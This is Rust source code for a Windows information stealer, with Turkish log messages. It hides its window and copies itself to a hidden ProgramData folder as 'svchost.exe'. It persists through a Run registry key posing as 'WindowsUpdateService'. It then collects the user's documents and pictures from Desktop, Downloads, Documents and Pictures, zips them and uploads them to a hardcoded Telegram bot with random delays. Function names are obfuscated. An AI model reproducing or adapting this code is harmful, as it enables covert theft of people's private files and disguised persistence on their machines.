#![windows_subsystem = "windows"]

use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use zip::ZipWriter;
use zip::write::FileOptions;
use dirs::{desktop_dir, document_dir, picture_dir, download_dir};
use tokio;
use rand::Rng;
use tokio::time::{sleep, Duration};
use winreg::enums::*;
use winreg::RegKey;
use std::process::Command;
use std::env;

const MAX_SIZE_PDF: u64 = 10 * 1024 * 1024;
const MAX_SIZE_DOC: u64 = 10 * 1024 * 1024;
const MAX_SIZE_DOCX: u64 = 10 * 1024 * 1024;
const MAX_SIZE_IMAGES: u64 = 5 * 1024 * 1024;
const MAX_SIZE_TXT: u64 = 3 * 1024 * 1024;
const MAX_ZIP_SIZE: u64 = 45 * 1024 * 1024;

#[derive(Clone)]
struct FileInfo {
    path: PathBuf,
    relative_path: String,
}

mod utils {
    use super::*;

    pub async fn random_delay() {
        let delay = rand::thread_rng().gen_range(1000..5000);
        sleep(Duration::from_millis(delay)).await;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    
    let programdata_path = env::var("PROGRAMDATA")
        .unwrap_or_else(|_| "C:\\ProgramData".to_string());
    let hidden_folder_path = Path::new(&programdata_path).join("WindowsUpdateService");
    let target_exe = hidden_folder_path.join("svchost.exe");
    
    if current_exe == target_exe {
        println!("ProgramData'dan çalışıyorum, doğrudan işleme başlıyorum...");
        return xyz123().await;
    }
    
    let already_installed = abc456(&target_exe);
    
    if !already_installed {
        if let Err(e) = def789(&target_exe) {
            eprintln!("ProgramData'ya kopyalama hatası: {}", e);
        }
        
        if let Err(e) = ghi012(&target_exe) {
            eprintln!("Registry'ye ekleme hatası: {}", e);
        }
    } else {
        println!("Zaten kurulu, tekrar kurmaya gerek yok...");
    }
    
    jkl345(&target_exe)?;
    
    Ok(())
}

async fn xyz123() -> Result<(), Box<dyn std::error::Error>> {
    let all_files = mno678()?;

    if all_files.is_empty() {
        println!("Dosya bulunamadı.");
        return Ok(());
    }

    println!("Toplam {} dosya bulundu.", all_files.len());

    let zip_chunks = pqr901(&all_files)?;

    println!("{} adet zip dosyası oluşturuldu.", zip_chunks.len());

    for (i, zip_data) in zip_chunks.iter().enumerate() {
        let file_name = format!("collected_files_part_{}.zip", i + 1);
        println!("{}. zip dosyası gönderiliyor...", i + 1);

        utils::random_delay().await;
        match stu234(zip_data, &file_name).await {
            Ok(_) => println!("{}. zip dosyası başarıyla gönderildi.", i + 1),
            Err(e) => println!("{}. zip dosyası gönderilirken hata: {}", i + 1, e),
        }
    }

    println!("İşlem tamamlandı.");
    Ok(())
}

fn abc456(target_exe: &Path) -> bool {
    let programdata_exists = target_exe.exists();
    
    let mut registry_exists = false;
    
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    match hkcu.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
        KEY_READ
    ) {
        Ok(run_key) => {
            match run_key.get_value::<String, _>("WindowsUpdateService") {
                Ok(existing_value) => {
                    let expected_path = target_exe.to_string_lossy();
                    if existing_value == expected_path {
                        registry_exists = true;
                    }
                },
                Err(_) => {}
            }
        },
        Err(_) => {}
    }
    
    programdata_exists && registry_exists
}

fn def789(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
    println!("ProgramData'ya kopyalanıyor...");
    
    let hidden_folder_path = target_exe.parent().unwrap();

    if !hidden_folder_path.exists() {
        fs::create_dir_all(&hidden_folder_path)?;
        Command::new("attrib")
            .args(&["+h", &hidden_folder_path.to_string_lossy()])
            .output()?;
    }
    let current_exe = env::current_exe()?;
    fs::copy(&current_exe, target_exe)?;
    Command::new("attrib")
        .args(&["+h", &target_exe.to_string_lossy()])
        .output()?;
    
    println!(".");
    Ok(())
}

fn ghi012(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
    println!("Registry'ye ekleniyor...");
    
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
        KEY_WRITE
    )?;
    
    let value_name = "WindowsUpdateService";
    let exe_path = target_exe.to_string_lossy();
    
    run_key.set_value(value_name, &exe_path.to_string())?;
    
    println!("Registry'ye başarıyla eklendi.");
    Ok(())
}

fn jkl345(target_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
    println!("ProgramData'daki kopya çalıştırılıyor...");
    
    if target_exe.exists() {
        Command::new(target_exe)
            .spawn()
            .ok();
    } else {
        println!("Hedef dosya bulunamadı!");
    }
    
    std::process::exit(0);
}

fn get_max_size_for_extension(extension: &str) -> u64 {
    match extension.to_lowercase().as_str() {
        "pdf" => MAX_SIZE_PDF,
        "doc" => MAX_SIZE_DOC,
        "docx" => MAX_SIZE_DOCX,
        "png" | "jpeg" | "jpg" => MAX_SIZE_IMAGES,
        "txt" => MAX_SIZE_TXT,
        _ => 0,
    }
}

fn is_target_file(path: &Path) -> bool {
    if let Some(extension) = path.extension() {
        let ext = extension.to_string_lossy().to_lowercase();
        matches!(ext.as_str(), "pdf" | "doc" | "docx" | "png" | "jpeg" | "jpg" | "txt")
    } else {
        false
    }
}

fn is_file_size_ok(path: &Path) -> bool {
    if let Some(extension) = path.extension() {
        let ext = extension.to_string_lossy().to_lowercase();
        let max_size = get_max_size_for_extension(&ext);

        if max_size == 0 {
            return false;
        }

        match fs::metadata(path) {
            Ok(metadata) => metadata.len() <= max_size,
            Err(_) => false,
        }
    } else {
        false
    }
}

fn vwx567(folder_path: &Path, base_folder: &str) -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
    let mut files = Vec::new();

    if !folder_path.exists() {
        return Ok(files);
    }

    fn walk_dir(
        dir: &Path,
        base_folder: &str,
        current_path: &str,
        files: &mut Vec<FileInfo>
    ) -> Result<(), Box<dyn std::error::Error>> {
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(_) => return Ok(()),
        };

        for entry in entries {
            let entry = match entry {
                Ok(entry) => entry,
                Err(_) => continue,
            };

            let path = entry.path();

            if path.is_file() {
                if is_target_file(&path) && is_file_size_ok(&path) {
                    let relative_path = if current_path.is_empty() {
                        format!("{}/{}", base_folder, path.file_name().unwrap().to_string_lossy())
                    } else {
                        format!("{}/{}/{}", base_folder, current_path, path.file_name().unwrap().to_string_lossy())
                    };
                    files.push(FileInfo { path, relative_path });
                }
            } else if path.is_dir() {
                let dir_name = match path.file_name() {
                    Some(name) => name.to_string_lossy(),
                    None => continue,
                };

                let new_current_path = if current_path.is_empty() {
                    dir_name.to_string()
                } else {
                    format!("{}/{}", current_path, dir_name)
                };
                if walk_dir(&path, base_folder, &new_current_path, files).is_err() {
                    continue;
                }
            }
        }
        Ok(())
    }

    walk_dir(folder_path, base_folder, "", &mut files)?;
    Ok(files)
}

fn mno678() -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
    let mut all_files = Vec::new();

    if let Some(desktop_path) = desktop_dir() {
        if let Ok(mut desktop_files) = vwx567(&desktop_path, "Desktop") {
            all_files.append(&mut desktop_files);
        }
    }

    if let Some(download_path) = download_dir() {
        if let Ok(mut download_files) = vwx567(&download_path, "Downloads") {
            all_files.append(&mut download_files);
        }
    }

    if let Some(document_path) = document_dir() {
        if let Ok(mut document_files) = vwx567(&document_path, "Documents") {
            all_files.append(&mut document_files);
        }
    }

    if let Some(picture_path) = picture_dir() {
        if let Ok(mut picture_files) = vwx567(&picture_path, "Pictures") {
            all_files.append(&mut picture_files);
        }
    }

    Ok(all_files)
}

fn yza890(files: &[FileInfo]) -> Result<Vec<Vec<FileInfo>>, Box<dyn std::error::Error>> {
    let mut chunks = Vec::new();
    let mut current_chunk = Vec::new();
    let mut current_size = 0;

    for file in files {
        let file_size = match fs::metadata(&file.path) {
            Ok(metadata) => metadata.len(),
            Err(_) => continue,
        };

        if file_size > MAX_ZIP_SIZE {
            continue;
        }

        if current_size + file_size > MAX_ZIP_SIZE && !current_chunk.is_empty() {
            chunks.push(current_chunk);
            current_chunk = Vec::new();
            current_size = 0;
        }

        current_chunk.push(file.clone());
        current_size += file_size;
    }

    if !current_chunk.is_empty() {
        chunks.push(current_chunk);
    }

    Ok(chunks)
}

fn pqr901(files: &[FileInfo]) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    let file_chunks = yza890(files)?;
    let mut all_zips = Vec::new();

    for chunk in file_chunks.iter() {
        let mut zip_buffer = Vec::new();
        {
            let mut zip_writer = ZipWriter::new(std::io::Cursor::new(&mut zip_buffer));

            let options = FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);

            for file_info in chunk {
                if zip_writer.start_file(file_info.relative_path.clone(), options).is_ok() {
                    if let Ok(mut file) = File::open(&file_info.path) {
                        let mut file_content = Vec::new();
                        if file.read_to_end(&mut file_content).is_ok() {
                            let _ = zip_writer.write_all(&file_content);
                        }
                    }
                }
            }

            zip_writer.finish()?;
        }

        all_zips.push(zip_buffer);
    }

    Ok(all_zips)
}

async fn stu234(zip_data: &[u8], file_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let bot_token = "7960837487:AAFKrBL143XIALZB39n9fQ9bXXT4ldrRlns";
    let chat_id = "7279467950";

    let url = format!("https://api.telegram.org/bot{}/sendDocument", bot_token);

    let client = reqwest::Client::new();

    let form = reqwest::multipart::Form::new()
        .text("chat_id", chat_id.to_string())
        .part("document",
            reqwest::multipart::Part::bytes(zip_data.to_vec())
                .file_name(file_name.to_string())
                .mime_str("application/zip")?
        );

    let response = client.post(&url)
        .multipart(form)
        .send()
        .await?;

    if !response.status().is_success() {
        let error_text = response.text().await?;
        return Err(error_text.into());
    }

    Ok(())
}